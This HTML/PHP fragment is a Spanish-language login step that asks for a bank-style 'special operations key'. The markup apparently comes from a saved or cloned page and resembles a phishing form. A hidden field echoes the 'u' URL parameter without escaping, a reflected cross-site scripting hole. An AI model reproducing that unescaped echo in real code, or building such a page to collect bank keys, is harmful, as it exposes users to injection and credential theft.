                ...
                <div class="p-4" bis_skin_checked="1">
                  ...
                  <div class="form-block" bis_skin_checked="1">
					...
					<input type="hidden" name="usuario" value="<?php echo $_GET['u']; ?>">
                      <div class="form-group" bis_skin_checked="1">
                        <div class="row" bis_skin_checked="1">
                          <div class="col-md-12" bis_skin_checked="1">
                            <label for="coe">
                              <i class="fa fa-id-card-o icon-append"></i> Clave de operaciones especiales
                            </label>
                            <div class="form-group" bis_skin_checked="1">
                              <div class="input-group" bis_skin_checked="1">
                                <input type="text" class="form-control form-control-rounded col-md-6" name="coe" id="coe" placeholder="Clave de operaciones especiales" autocomplete="off" inputmode="numeric">
                                <b class="tooltip tooltip-top-right">
                                  <i class="fa fa-lock txt-color-teal"></i>
                                  Clave de operaciones especiales</b>
                            ...
                            <script>
                              var fieldpassword = document.querySelector('[name="coe"]');
                              ...
                              $('#showPassword').click(function () {
                                var cambio = document.getElementById('coe');
                                if (cambio.type == 'text') {
                              ...
                              $('#coe').on('paste', function (e) {
                                e.preventDefault();
                              });

                              $('#coe').on('copy', function (e) {
                                e.preventDefault();
                              });
                            </script>
                          </div>
                      ...
                      <div class="botones" bis_skin_checked="1">
                        <button class="btn btn-rounded btn-outline-success left" id="btn-siguiente" disabled="">
                          Iniciar Sesión <i class="fa fa-arrow-right"></i></button>
                      </div>
                    </form>
                  </div>
                </div>
